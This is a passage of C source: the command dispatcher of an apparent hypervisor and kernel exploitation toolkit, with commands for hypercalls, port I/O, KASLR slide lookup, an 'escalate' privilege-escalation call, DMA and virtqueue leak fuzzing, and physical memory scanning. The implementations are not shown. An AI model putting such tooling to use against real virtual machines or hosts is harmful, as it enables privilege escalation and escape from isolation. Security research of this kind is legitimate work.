            unsigned short port = (unsigned short)strtoul(argv[2], NULL, 0);
            unsigned int size = (unsigned int)strtoul(argv[3], NULL, 0);
            read_port(port, size);
        }
    }
    else if (strcmp(command, "write_port") == 0) {
        if (argc < 5) {
            printf("Usage: write_port <port> <size> <value>\n");
        } else {
            unsigned short port = (unsigned short)strtoul(argv[2], NULL, 0);
            unsigned int size = (unsigned int)strtoul(argv[3], NULL, 0);
            unsigned int value = (unsigned int)strtoul(argv[4], NULL, 0);
            write_port(port, size, value);
        }
    }
    
    /* Symbol and info commands */
    else if (strcmp(command, "lookup") == 0) {
        if (argc < 3) {
            printf("Usage: lookup <symbol_name>\n");
        } else {
            lookup_symbol(argv[2]);
        }
    }
    else if (strcmp(command, "kernel_base") == 0) {
        get_kernel_base();
    }
    else if (strcmp(command, "kaslr") == 0) {
        get_kaslr_slide();
    }
    else if (strcmp(command, "current_task") == 0) {
        get_current_task();
    }
    else if (strcmp(command, "escalate") == 0) {
        escalate_privileges();
    }
    else if (strcmp(command, "status") == 0) {
        check_status();
    }
    
    /* Hypercall commands */
    else if (strcmp(command, "trigger_hypercall") == 0) {
        trigger_hypercall();
    }
    else if (strcmp(command, "hypercall") == 0) {
        if (argc < 7) {
            printf("Usage: hypercall <nr> <a0> <a1> <a2> <a3>\n");
        } else {
            unsigned long nr = strtoul(argv[2], NULL, 0);
            unsigned long a0 = strtoul(argv[3], NULL, 0);
            unsigned long a1 = strtoul(argv[4], NULL, 0);
            unsigned long a2 = strtoul(argv[5], NULL, 0);
            unsigned long a3 = strtoul(argv[6], NULL, 0);
            hypercall_with_args(nr, a0, a1, a2, a3);
        }
    }
    
    /* Automation harnesses */
    else if (strcmp(command, "vq_fuzz") == 0) {
        if (argc < 5) {
            printf("Usage: vq_fuzz <iters> <max_index> <mode> [trigger_every]\n");
        } else {
            int iters = atoi(argv[2]);
            int max_index = atoi(argv[3]);
            int mode = atoi(argv[4]);
            int trigger_every = (argc > 5) ? atoi(argv[5]) : 100;
            vq_fuzz(iters, max_index, mode, trigger_every);
        }
    }
    else if (strcmp(command, "dma_probe") == 0) {
        int pages = 8;
        int pattern = 0;
        int trigger = 1;
        if (argc > 2) pages = atoi(argv[2]);
        if (argc > 3) pattern = atoi(argv[3]);
        if (argc > 4) trigger = atoi(argv[4]);
        dma_probe(pages, pattern, trigger);
    }
    else if (strcmp(command, "msr_fuzz") == 0) {
        if (argc < 4) {
            printf("Usage: msr_fuzz <start> <end> <patterns_mask>\n");
        } else {
            unsigned int start = (unsigned int)strtoul(argv[2], NULL, 0);
            unsigned int end = (unsigned int)strtoul(argv[3], NULL, 0);
            unsigned int mask = (argc > 4) ? (unsigned int)strtoul(argv[4], NULL, 0) : 0xf;
            msr_fuzz(start, end, mask);
        }
    }
    else if (strcmp(command, "crash_monitor") == 0) {
        if (argc < 3) {
            printf("Usage: crash_monitor start|stop\n");
        } else if (strcmp(argv[2], "start") == 0) {
            start_crash_monitor();
        } else if (strcmp(argv[2], "stop") == 0) {
            stop_crash_monitor();
        } else {
            printf("Usage: crash_monitor start|stop\n");
        }
    }
    else if (strcmp(command, "v2p_fast") == 0) {
        if (argc < 3) {
            printf("Usage: v2p_fast <phys> [start] [end] [step] [progress_every]\n");
        } else {
            unsigned long target = strtoul(argv[2], NULL, 0);
            unsigned long start_va = 0xffff888000000000UL;
            unsigned long end_va = 0xffffc87fffffffffUL;
            unsigned long step = 0x1000;
            unsigned long progress_every = 10000;
            if (argc > 3) start_va = strtoul(argv[3], NULL, 0);
            if (argc > 4) end_va = strtoul(argv[4], NULL, 0);
            if (argc > 5) step = strtoul(argv[5], NULL, 0);
            if (argc > 6) progress_every = strtoul(argv[6], NULL, 0);
            virt_to_phys_scan_fast(target, start_va, end_va, step, progress_every);
        }
    }
    
    /* ADAPTIVE FUZZING COMMANDS */
    else if (strcmp(command, "adaptive_vq_fuzz") == 0) {
        if (argc < 3) {
            printf("Usage: adaptive_vq_fuzz <max_iterations> [starting_corruption_%%]\n");
            printf("  max_iterations: Total iterations across all phases\n");
            printf("  starting_corruption: Initial corruption level 0-100 (default: 10)\n");
            printf("\nExample: adaptive_vq_fuzz 1000 10\n");
            printf("  Starts at 10%% corruption, increases by 10%% each phase\n");
        } else {
            int max_iter = atoi(argv[2]);
            int corruption = (argc > 3) ? atoi(argv[3]) : 10;
            adaptive_vq_leak_fuzz(max_iter, corruption);
        }
    }
    else if (strcmp(command, "adaptive_dma_fuzz") == 0) {
        if (argc < 3) {
            printf("Usage: adaptive_dma_fuzz <pages> [starting_corruption_%%]\n");
            printf("  pages: Number of DMA pages to allocate (1-16)\n");
            printf("  starting_corruption: Initial corruption level 0-100 (default: 20)\n");
            printf("\nExample: adaptive_dma_fuzz 8 20\n");
        } else {
            int pages = atoi(argv[2]);
            int corruption = (argc > 3) ? atoi(argv[3]) : 20;
            adaptive_dma_leak_fuzz(pages, corruption);
        }
    }
    else if (strcmp(command, "progressive_scan") == 0) {
        if (argc < 4) {
            printf("Usage: progressive_scan <start_addr> <end_addr> [initial_step] [phases]\n");
            printf("  start_addr: Starting physical address\n");
            printf("  end_addr: Ending physical address\n");
            printf("  initial_step: Initial scan step size (default: 0x10000)\n");
            printf("  phases: Number of scan phases (default: 5)\n");
            printf("\nExample: progressive_scan 0x1000000 0x2000000 0x10000 5\n");
            printf("  Scans 16MB range, starting with 64KB steps, halving each phase\n");
        } else {
            unsigned long start = strtoul(argv[2], NULL, 0);
            unsigned long end = strtoul(argv[3], NULL, 0);
            unsigned long step = (argc > 4) ? strtoul(argv[4], NULL, 0) : 0x10000;
            int phases = (argc > 5) ? atoi(argv[5]) : 5;
            progressive_memory_scan(start, end, step, phases);
        }
    }
    else if (strcmp(command, "show_leaks") == 0) {
        show_leak_candidates();
    }
    else if (strcmp(command, "reset_leaks") == 0) {
        reset_leak_candidates();
        printf("[+] Leak candidate list cleared\n");
    }
    /* Unknown command */
    else {
        printf("Unknown command: %s\n\n", command);
        print_help();
        return 1;
    }

    return 0;
}